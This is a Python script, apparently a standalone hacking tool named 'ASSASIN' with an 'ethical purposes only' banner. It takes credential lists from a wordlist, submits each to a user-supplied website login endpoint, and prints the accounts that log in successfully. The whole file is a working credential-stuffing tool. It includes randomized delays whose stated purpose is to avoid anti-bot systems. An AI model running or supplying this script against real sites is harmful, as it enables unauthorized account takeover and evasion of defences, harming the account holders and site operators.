import requests
from time import sleep
from random import randint

# ANSI Regular Font Header
def print_header():
    header = """
    \033[1;31m
     █████╗ ███████╗███████╗ █████╗ ███████╗██╗███╗   ██╗
    ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██║████╗  ██║
    ███████║███████╗███████╗███████║███████╗██║██╔██╗ ██║
    ██╔══██║╚════██║╚════██║██╔══██║╚════██║██║██║╚██╗██║
    ██║  ██║███████║███████║██║  ██║███████║██║██║ ╚████║
    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝
    \033[1;92m         Developed by Shaheer Yasir
        For Ethical Purposes Only
    \033[0m
    """
    print(header)


# Function to load credentials from a wordlist
def load_wordlist(wordlist_file):
    credentials = []
    try:
        with open(wordlist_file, "r") as file:
            for line in file:
                parts = line.strip().split(",")
                if len(parts) == 3:
                    credentials.append({
                        "email": parts[0] if parts[0] != "None" else None,
                        "username": parts[1] if parts[1] != "None" else None,
                        "password": parts[2]
                    })
        print(f"\033[1;32m[+] Loaded {len(credentials)} credentials from the wordlist.\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Failed to load wordlist: {e}\033[0m")
    return credentials


# Function to generate test credentials dynamically
def generate_test_credentials():
    print("\033[1;33m[-] No wordlist provided. Generating test credentials in real-time...\033[0m")
    return [
        {"email": "test1@example.com", "username": None, "password": "password123"},
        {"email": None, "username": "testuser", "password": "test1234"},
        {"email": "admin@example.com", "username": None, "password": "admin123"},
        {"email": None, "username": "guest", "password": "guest123"}
    ]


# Function to hunt for active accounts
def hunt_accounts(target_url, credentials):
    print("\033[1;33m[+] Starting the account hunting process...\033[0m")
    active_accounts = []

    try:
        for index, credential in enumerate(credentials):
            email = credential.get("email")
            username = credential.get("username")
            password = credential.get("password")

            # Simulate a login POST request
            print(f"\033[1;34m[*] Testing credentials {index + 1}/{len(credentials)}: {email or username}...\033[0m")
            response = requests.post(
                target_url,
                data={
                    "email": email,
                    "username": username,
                    "password": password,
                },
                timeout=10
            )

            # Check if the account is active (based on HTTP status code or response content)
            if response.status_code == 200 and "login successful" in response.text.lower():
                print(f"\033[1;32m[+] Active Account Found: {email or username}\033[0m")
                active_accounts.append(credential)
            else:
                print(f"\033[1;31m[-] Account inactive or invalid: {email or username}\033[0m")

            # Add a delay to prevent triggering anti-bot systems
            sleep(randint(1, 3))

    except Exception as e:
        print(f"\033[1;31m[-] An error occurred: {e}\033[0m")

    return active_accounts


# Main function
if __name__ == "__main__":
    # Print the header
    print_header()

    # Ask the user for the target website URL
    target_url = input("\033[1;34mEnter the target website's login endpoint (e.g., https://example.com/login): \033[0m").strip()

    if not target_url:
        print("\033[1;31m[-] No URL provided. Exiting...\033[0m")
        exit(1)

    # Ask the user for a custom wordlist
    wordlist_file = input("\033[1;34mEnter the path to your custom wordlist (leave blank to use real-time generated credentials): \033[0m").strip()

    # Load credentials from the wordlist or generate test credentials
    if wordlist_file:
        credentials = load_wordlist(wordlist_file)
    else:
        credentials = generate_test_credentials()

    if not credentials:
        print("\033[1;31m[-] No credentials to test. Exiting...\033[0m")
        exit(1)

    # Hunt for active accounts
    active_accounts = hunt_accounts(target_url, credentials)

    # Display the results
    print("\033[1;36m\n[+] Account Hunting Process Completed.\033[0m")
    if active_accounts:
        print("\033[1;32m[+] Active Accounts Found:\033[0m")
        for account in active_accounts:
            print(f"    - Email: {account.get('email')} | Username: {account.get('username')} | Password: {account.get('password')}")
    else:
        print("\033[1;31m[-] No active accounts were found.\033[0m")
